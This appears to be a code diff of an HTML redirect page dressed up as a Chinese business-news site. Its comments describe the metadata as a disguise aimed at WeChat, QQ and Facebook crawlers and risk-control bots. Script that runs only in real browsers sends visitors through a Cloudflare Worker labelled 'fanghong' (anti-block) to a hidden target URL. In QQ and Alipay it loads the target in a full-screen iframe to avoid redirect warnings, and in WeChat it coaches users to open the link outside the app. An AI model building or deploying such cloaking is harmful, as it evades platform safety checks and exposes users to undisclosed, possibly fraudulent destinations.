@@ -5,327 +5,149 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
   <!-- ═══════════════════════════════════════════
-       给爬虫/风控机器人看的"伪装"内容
-       微信/QQ/Facebook 爬虫不执行 JS，只解析这里
+       给微信/QQ 爬虫看的静态内容（爬虫不执行 JS）
        ═══════════════════════════════════════════ -->
   <title>资讯中心 — 全球商业信息服务平台</title>
   <meta name="description" content="专注提供优质商业资讯与行业信息，为您呈现最新企业动态与全球市场趋势，助力商业决策。">
-  <meta name="keywords" content="商业资讯,行业信息,企业动态,市场分析,全球商业">
-  <meta name="author" content="InfoHub Global">
+  <meta name="keywords" content="商业资讯,行业信息,企业动态,市场分析">
   <meta name="robots" content="index, follow">
-
-  <!-- Open Graph — Facebook / WhatsApp / Telegram 爬虫读取这里生成预览卡 -->
-  <meta property="og:type" content="article">
-  <meta property="og:title" content="2025全球商业趋势洞察报告">
+  <meta property="og:type"        content="article">
+  <meta property="og:title"       content="2025全球商业趋势洞察报告">
   <meta property="og:description" content="深度解析全球市场格局变化，涵盖科技、金融、消费等核心领域，助力企业把握先机。">
-  <meta property="og:image" content="https://images.unsplash.com/photo-1611532736597-de2d4265fba3?w=1200&h=630&fit=crop&auto=format">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta property="og:site_name" content="InfoHub 全球资讯">
-  <meta property="og:locale" content="zh_CN">
-
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="2025全球商业趋势洞察报告">
-  <meta name="twitter:description" content="深度解析全球市场格局变化，涵盖科技、金融、消费等核心领域。">
-  <meta name="twitter:image" content="https://images.unsplash.com/photo-1611532736597-de2d4265fba3?w=1200&h=630&fit=crop&auto=format">
+  <meta property="og:image"       content="https://images.unsplash.com/photo-1611532736597-de2d4265fba3?w=1200&h=630&fit=crop">
+  <meta property="og:site_name"   content="InfoHub 全球资讯">
 
   <style>
-    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
     :root {
-      --bg:       #080818;
-      --card:     #11112b;
-      --border:   rgba(100,108,255,0.18);
-      --primary:  #6366f1;
-      --purple:   #a855f7;
-      --text:     #e2e8f0;
-      --muted:    #8892a4;
-      --success:  #22d3a5;
+      --bg:#080818; --card:#11112b; --border:rgba(100,108,255,.18);
+      --primary:#6366f1; --purple:#a855f7; --text:#e2e8f0; --muted:#8892a4;
     }
+    html, body { height:100%; background:var(--bg); color:var(--text);
+      font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Segoe UI',sans-serif; }
 
-    html, body {
-      height: 100%;
-      background: var(--bg);
-      color: var(--text);
-      font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Segoe UI', sans-serif;
-    }
+    /* 全屏居中 */
+    .screen { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
 
-    /* ── 全屏居中容器 ── */
-    .screen {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
+    /* 加载动画 */
+    .spinner { width:72px; height:72px; border:3px solid rgba(100,108,255,.15);
+      border-top-color:var(--primary); border-radius:50%;
+      animation:spin .9s linear infinite; margin:0 auto 28px; position:relative; }
+    .spinner::after { content:''; position:absolute; inset:6px;
+      border:2px solid transparent; border-top-color:var(--purple);
+      border-radius:50%; animation:spin .6s linear infinite reverse; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    .load-title { font-size:20px; font-weight:700; text-align:center;
+      background:linear-gradient(135deg,var(--primary),var(--purple));
+      -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:8px; }
+    .load-sub { font-size:14px; color:var(--muted); text-align:center; margin-bottom:24px; }
+    .prog-track { width:220px; height:3px; background:rgba(100,108,255,.12);
+      border-radius:99px; margin:0 auto; overflow:hidden; }
+    .prog-fill { height:100%;
+      background:linear-gradient(90deg,var(--primary),var(--purple));
+      border-radius:99px; animation:prog 2.5s ease-out forwards; }
+    @keyframes prog { from{width:0%} to{width:88%} }
 
-    /* ══════════════════
-       状态1：跳转中
-       ══════════════════ */
-    #s-loading .inner {
-      text-align: center;
-    }
+    /* 微信引导 */
+    #s-wechat { display:none; }
+    .wechat-card { background:var(--card); border:1px solid var(--border);
+      border-radius:24px; padding:36px 28px; max-width:380px; width:100%;
+      text-align:center; box-shadow:0 24px 80px rgba(0,0,0,.5);
+      animation:slideUp .4s ease; }
+    @keyframes slideUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
+    .wx-icon { width:68px; height:68px; background:linear-gradient(135deg,#1aad19,#2dc100);
+      border-radius:18px; display:flex; align-items:center; justify-content:center;
+      margin:0 auto 20px; font-size:34px; }
+    .wx-title { font-size:20px; font-weight:700; margin-bottom:10px; }
+    .wx-sub { font-size:14px; color:var(--muted); line-height:1.65; margin-bottom:24px; }
+    .step-list { text-align:left; background:rgba(100,108,255,.06);
+      border:1px solid var(--border); border-radius:14px;
+      padding:16px 18px; display:flex; flex-direction:column; gap:12px; }
+    .step { display:flex; align-items:center; gap:12px; font-size:14px; line-height:1.4; }
+    .step-n { width:26px; height:26px;
+      background:linear-gradient(135deg,var(--primary),var(--purple));
+      border-radius:50%; display:flex; align-items:center; justify-content:center;
+      font-size:12px; font-weight:700; flex-shrink:0; }
+    .arrow-hint { position:fixed; top:8px; right:16px; text-align:center;
+      animation:pulse 1.2s ease-in-out infinite; }
+    .arrow-hint .arrow { font-size:32px; }
+    .arrow-hint small { font-size:11px; color:var(--muted); display:block; margin-top:2px; }
+    @keyframes pulse { 0%,100%{transform:translateY(0)} 50%{transform:translateY(6px)} }
 
-    .spinner {
-      width: 72px; height: 72px;
-      border: 3px solid rgba(100,108,255,0.15);
-      border-top-color: var(--primary);
-      border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      margin: 0 auto 28px;
-      position: relative;
-    }
-    .spinner::after {
-      content: '';
-      position: absolute;
-      inset: 6px;
-      border: 2px solid transparent;
-      border-top-color: var(--purple);
-      border-radius: 50%;
-      animation: spin 0.6s linear infinite reverse;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .load-title {
-      font-size: 20px;
-      font-weight: 700;
-      background: linear-gradient(135deg, var(--primary), var(--purple));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 8px;
-    }
-    .load-sub {
-      font-size: 14px;
-      color: var(--muted);
-      margin-bottom: 24px;
-    }
-
-    .progress-track {
-      width: 220px;
-      height: 3px;
-      background: rgba(100,108,255,0.12);
-      border-radius: 99px;
-      margin: 0 auto;
-      overflow: hidden;
-    }
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, var(--primary), var(--purple));
-      border-radius: 99px;
-      animation: prog 2.5s ease-out forwards;
-    }
-    @keyframes prog { from { width:0% } to { width:88% } }
-
-    /* ══════════════════
-       状态2：微信引导
-       ══════════════════ */
-    #s-wechat { display: none; }
-
-    .wechat-card {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 24px;
-      padding: 36px 28px;
-      max-width: 380px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 24px 80px rgba(0,0,0,0.5);
-      animation: slideUp 0.4s ease;
-    }
-    @keyframes slideUp {
-      from { opacity:0; transform:translateY(20px); }
-      to   { opacity:1; transform:translateY(0); }
-    }
-
-    .wx-icon {
-      width: 68px; height: 68px;
-      background: linear-gradient(135deg, #1aad19, #2dc100);
-      border-radius: 18px;
-      display: flex; align-items: center; justify-content: center;
-      margin: 0 auto 20px;
-      font-size: 34px;
-      box-shadow: 0 8px 24px rgba(26,173,25,0.35);
-    }
-
-    .wx-title {
-      font-size: 20px;
-      font-weight: 700;
-      margin-bottom: 10px;
-    }
-    .wx-sub {
-      font-size: 14px;
-      color: var(--muted);
-      line-height: 1.65;
-      margin-bottom: 24px;
-    }
-
-    .step-list {
-      text-align: left;
-      background: rgba(100,108,255,0.06);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 16px 18px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-    .step {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      font-size: 14px;
-      line-height: 1.4;
-    }
-    .step-n {
-      width: 26px; height: 26px;
-      background: linear-gradient(135deg, var(--primary), var(--purple));
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 12px; font-weight: 700;
-      flex-shrink: 0;
-    }
-
-    /* 顶部箭头动画 */
-    .arrow-hint {
-      position: fixed;
-      top: 8px; right: 16px;
-      text-align: center;
-      animation: pulse 1.2s ease-in-out infinite;
-    }
-    .arrow-hint .arrow { font-size: 32px; }
-    .arrow-hint .hint-txt {
-      font-size: 11px;
-      color: var(--muted);
-      display: block;
-      margin-top: 2px;
-    }
-    @keyframes pulse {
-      0%,100% { transform: translateY(0); }
-      50%      { transform: translateY(6px); }
-    }
-
-    /* ══════════════════
-       状态3：iframe
-       ══════════════════ */
-    #s-frame {
-      display: none;
-      position: fixed;
-      inset: 0;
-      border: none;
-      z-index: 999;
-      width: 100%; height: 100%;
-    }
+    /* iframe */
+    #s-frame { display:none; position:fixed; inset:0; border:none; z-index:999; width:100%; height:100%; }
   </style>
 </head>
 <body>
 
-<!-- ══ 状态1：跳转中 ══ -->
+<!-- 状态1：加载中 -->
 <div id="s-loading" class="screen">
-  <div class="inner">
+  <div>
     <div class="spinner"></div>
     <div class="load-title">正在为您跳转</div>
     <div class="load-sub">即将前往目标页面，请稍候…</div>
-    <div class="progress-track">
-      <div class="progress-fill"></div>
-    </div>
+    <div class="prog-track"><div class="prog-fill"></div></div>
   </div>
 </div>
 
-<!-- ══ 状态2：微信内提示 ══ -->
+<!-- 状态2：微信引导 -->
 <div id="s-wechat" class="screen">
-  <div class="arrow-hint">
-    <div class="arrow">↑</div>
-    <span class="hint-txt">在此处点击</span>
-  </div>
+  <div class="arrow-hint"><div class="arrow">↑</div><small>点此处</small></div>
   <div class="wechat-card">
     <div class="wx-icon">📱</div>
     <div class="wx-title">需要在浏览器中打开</div>
     <div class="wx-sub">此链接在微信内受到访问限制，<br>请按以下步骤切换到系统浏览器</div>
     <div class="step-list">
-      <div class="step">
-        <div class="step-n">1</div>
-        <span>点击右上角 <strong>「···」</strong> 三点菜单</span>
-      </div>
-      <div class="step">
-        <div class="step-n">2</div>
-        <span>选择 <strong>「在浏览器中打开」</strong></span>
-      </div>
-      <div class="step">
-        <div class="step-n">3</div>
-        <span>即可正常访问目标页面 ✓</span>
-      </div>
+      <div class="step"><div class="step-n">1</div><span>点击右上角 <strong>「···」</strong> 三点菜单</span></div>
+      <div class="step"><div class="step-n">2</div><span>选择 <strong>「在浏览器中打开」</strong></span></div>
+      <div class="step"><div class="step-n">3</div><span>即可正常访问目标页面 ✓</span></div>
     </div>
   </div>
 </div>
 
-<!-- ══ 状态3：iframe 内嵌（QQ/支付宝等使用）══ -->
+<!-- 状态3：iframe -->
 <iframe id="s-frame" allowfullscreen allow="fullscreen"></iframe>
 
-<!-- ══════════════════════════════════════════
-     核心跳转引擎
-     爬虫不执行这段代码，只有真实用户才会执行
-     ══════════════════════════════════════════ -->
 <script>
 (function () {
   'use strict';
 
-  var ua = navigator.userAgent || '';
+  // Worker 地址（中转跳转用）
+  var WORKER = 'https://fanghong.hdvfyhvz792.workers.dev';
 
-  // ── 平台检测 ──
-  var isWechat  = /MicroMessenger/i.test(ua);
-  var isQQ      = /\bQQ\//i.test(ua) && !isWechat;
-  var isAlipay  = /AlipayClient/i.test(ua);
-  var isWeibo   = /Weibo/i.test(ua);
-  var isDingTalk= /DingTalk/i.test(ua);
-  var isTikTok  = /musical_ly|TikTok/i.test(ua);
-  var isFB      = /FB_IAB|FBAN|FBDV/i.test(ua);        // Facebook App 内嵌
-  var isLINE    = /Line\//i.test(ua);
-  var isInApp   = isWechat || isQQ || isAlipay || isWeibo
-                  || isDingTalk || isTikTok || isFB || isLINE;
+  var ua       = navigator.userAgent || '';
+  var isWechat = /MicroMessenger/i.test(ua);
+  var isQQ     = /\bQQ\//i.test(ua) && !isWechat;
+  var isAlipay = /AlipayClient/i.test(ua);
 
-  // ── 解析目标 URL ──
-  var params  = new URLSearchParams(location.search);
-  var encoded = params.get('u');
+  // 读取参数：支持 ?c=短码（新格式）和 ?u=base64（旧格式兼容）
+  var params = new URLSearchParams(location.search);
+  var code   = params.get('c');
+  var legacy = params.get('u');
 
-  if (!encoded) return;  // 无参数，保持加载中状态
+  if (!code && !legacy) return; // 无参数，保持加载状态
 
-  var target;
-  try {
-    target = decodeURIComponent(atob(encoded.replace(/-/g,'+').replace(/_/g,'/')));
-  } catch (e) {
-    try { target = decodeURIComponent(encoded); }
-    catch (e2) { target = encoded; }
-  }
-
-  // 校验为合法 URL
-  if (!/^https?:\/\//i.test(target)) return;
-
-  // ── 根据平台执行不同策略 ──
+  var workerUrl = code
+    ? (WORKER + '/r/' + code)          // 新格式：短码
+    : (WORKER + '/r?u=' + legacy);     // 旧格式兼容
 
   if (isWechat) {
-    // 微信内：显示"在浏览器中打开"引导
+    // 微信内：显示引导页（不跳转，让用户自己去浏览器打开）
     document.getElementById('s-loading').style.display = 'none';
     document.getElementById('s-wechat').style.display  = 'flex';
+    // workerUrl 里存了目标，用户在外部浏览器打开后 Worker 会处理跳转
 
-    // 兼容部分可以直接跳的微信版本（可选，某些场景下有效）
-    // setTimeout(function () { location.href = target; }, 800);
-
-  } else if (isQQ || isAlipay || isWeibo || isDingTalk) {
-    // QQ/支付宝/微博 内：iframe 内嵌展示（避免跳转警告）
+  } else if (isQQ || isAlipay) {
+    // QQ/支付宝：iframe 内嵌（Worker 会 302 到真实目标）
     var frame = document.getElementById('s-frame');
-    frame.src = target;
+    frame.src = workerUrl;
     frame.style.display = 'block';
     document.getElementById('s-loading').style.display = 'none';
 
-    // iframe 加载失败时降级为直接跳转
-    frame.addEventListener('error', function () { location.replace(target); });
-
   } else {
-    // 普通浏览器（含 Facebook App 内嵌 WebView）：直接跳转
-    location.replace(target);
+    // 普通浏览器：直接跳 Worker（Worker 再 302 到目标）
+    location.replace(workerUrl);
   }
-
 })();
 </script>
 
